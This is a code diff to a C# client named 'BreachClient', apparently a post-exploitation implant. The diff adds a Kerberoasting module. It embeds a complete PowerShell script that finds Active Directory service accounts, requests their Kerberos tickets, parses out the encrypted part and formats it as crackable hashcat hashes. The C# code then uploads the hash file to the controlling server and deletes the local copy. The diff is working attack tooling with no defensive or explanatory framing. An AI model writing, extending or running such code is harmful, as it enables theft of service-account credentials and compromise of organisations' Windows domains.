@@ -78,6 +78,7 @@ namespace BreachClient
                     "recon"        => await RunRecon(instruction),
                     "sharphound"   => await RunSharpHound(instruction),
                     "certipy"      => await RunCertipy(instruction),
+                    "kerberoast"   => await RunKerberoast(instruction),
                     "secretsdump"  => await RunDownloadAndExec(instruction),
                     "dpapi"        => await RunDownloadAndExec(instruction),
                     "authenticate" => RunAuthenticate(instruction),
@@ -274,6 +275,126 @@ namespace BreachClient
             {
                 try { Directory.Delete(workDir, recursive: true); } catch { }
             }
+        }
+
+        // ── Kerberoast module ─────────────────────────────────────────────────
+
+        /// <summary>
+        /// Enumerate SPN accounts via ADSI, request TGS tickets natively using
+        /// System.IdentityModel, parse the raw ASN.1 AP-REQ to extract the cipher,
+        /// and output hashes in hashcat $krb5tgs$ format.
+        /// No external tools required — uses only what is already on Windows.
+        /// </summary>
+        static async Task<string> RunKerberoast(string _)
+        {
+            string script = @"
+Add-Type -AssemblyName System.IdentityModel
+
+function ParseLen([byte[]]$bytes, [ref]$pos) {
+    $b = $bytes[$pos.Value]; $pos.Value++
+    if ($b -lt 0x80) { return [int]$b }
+    $nb = $b -band 0x7f; $val = 0
+    for ($j = 0; $j -lt $nb; $j++) { $val = ($val -shl 8) -bor $bytes[$pos.Value]; $pos.Value++ }
+    return [int]$val
+}
+
+function EnterTag([byte[]]$bytes, [ref]$pos, [byte]$tag) {
+    if ($bytes[$pos.Value] -ne $tag) {
+        throw ""Tag mismatch at $($pos.Value): expected 0x$([Convert]::ToString($tag,16)) got 0x$([Convert]::ToString($bytes[$pos.Value],16))""
+    }
+    $pos.Value++
+    return ParseLen $bytes $pos
+}
+
+function SkipTLV([byte[]]$bytes, [ref]$pos) {
+    $pos.Value++
+    $len = ParseLen $bytes $pos
+    $pos.Value += $len
+}
+
+function ExtractCipher([byte[]]$apreq) {
+    $pos = [ref]0
+    $null = EnterTag $apreq $pos 0x6e   # Application 14 (AP-REQ)
+    $null = EnterTag $apreq $pos 0x30   # SEQUENCE
+    SkipTLV $apreq $pos                  # [0] pvno
+    SkipTLV $apreq $pos                  # [1] msg-type
+    SkipTLV $apreq $pos                  # [2] ap-options
+    $null = EnterTag $apreq $pos 0xa3   # [3] ticket
+    $null = EnterTag $apreq $pos 0x61   # Application 1 (Ticket)
+    $null = EnterTag $apreq $pos 0x30   # SEQUENCE
+    SkipTLV $apreq $pos                  # [0] tkt-vno
+    SkipTLV $apreq $pos                  # [1] realm
+    SkipTLV $apreq $pos                  # [2] sname
+    $null = EnterTag $apreq $pos 0xa3   # [3] enc-part
+    $null = EnterTag $apreq $pos 0x30   # EncryptedData SEQUENCE
+    $null = EnterTag $apreq $pos 0xa0   # [0] etype context
+    $etypeLen = EnterTag $apreq $pos 0x02  # INTEGER
+    $etype = 0
+    for ($j = 0; $j -lt $etypeLen; $j++) { $etype = ($etype -shl 8) -bor $apreq[$pos.Value]; $pos.Value++ }
+    if ($apreq[$pos.Value] -eq 0xa1) { SkipTLV $apreq $pos }  # skip optional [1] kvno
+    $null = EnterTag $apreq $pos 0xa2   # [2] cipher context
+    $cipherLen = EnterTag $apreq $pos 0x04  # OCTET STRING
+    $cipher = $apreq[$pos.Value..($pos.Value + $cipherLen - 1)]
+    return @{ etype = $etype; cipher = $cipher }
+}
+
+$domain = $env:USERDNSDOMAIN
+$root = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$domain"")
+$searcher = New-Object System.DirectoryServices.DirectorySearcher($root)
+$searcher.Filter = ""(&(objectCategory=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))""
+$searcher.PropertiesToLoad.AddRange([string[]]@(""samaccountname"", ""serviceprincipalname""))
+$results = $searcher.FindAll()
+
+if ($results.Count -eq 0) {
+    Write-Host ""[-] No kerberoastable accounts found""
+    exit
+}
+
+Write-Host ""[*] Found $($results.Count) account(s) with SPNs""
+
+foreach ($r in $results) {
+    $user = $r.Properties[""samaccountname""][0]
+    foreach ($spn in $r.Properties[""serviceprincipalname""]) {
+        try {
+            $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+            $bytes = $token.GetRequest()
+            $parsed = ExtractCipher $bytes
+            $cipher = $parsed.cipher
+            $etype  = $parsed.etype
+
+            if ($etype -eq 23) {
+                $check = ($cipher[0..15]                  | ForEach-Object { '{0:x2}' -f $_ }) -join ''
+                $data  = ($cipher[16..($cipher.Length-1)] | ForEach-Object { '{0:x2}' -f $_ }) -join ''
+                Write-Host ""`$krb5tgs`$23`$*$($user)*$($domain)*$($spn)*`$$($check)`$$($data)""
+            } elseif ($etype -eq 17 -or $etype -eq 18) {
+                $hex = ($cipher | ForEach-Object { '{0:x2}' -f $_ }) -join ''
+                Write-Host ""`$krb5tgs`$$($etype)`$*$($user)*$($domain)*$($spn)*`$$($hex)""
+            } else {
+                Write-Host ""[-] $($user) : $($spn) - unsupported etype $($etype)""
+            }
+        } catch {
+            Write-Host ""[-] Failed $($spn) : $_""
+        }
+    }
+}
+";
+            string output = RunPowerShell(script);
+
+            var hashLines = output.Split('\n')
+                .Select(l => l.Trim())
+                .Where(l => l.StartsWith("$krb5tgs$"))
+                .ToArray();
+
+            if (hashLines.Length > 0)
+            {
+                string hashFile = Path.Combine(Path.GetTempPath(), "kbr_" + Guid.NewGuid().ToString("N")[..8] + ".txt");
+                await File.WriteAllLinesAsync(hashFile, hashLines);
+                await UploadFile(hashFile);
+                try { File.Delete(hashFile); } catch { }
+                return output.Trim() + $"\n[+] {hashLines.Length} hash(es) uploaded to server";
+            }
+
+            return output.Trim();
         }
 
         // ── Generic tool execution (secretsdump, dpapi, …) ───────────────────
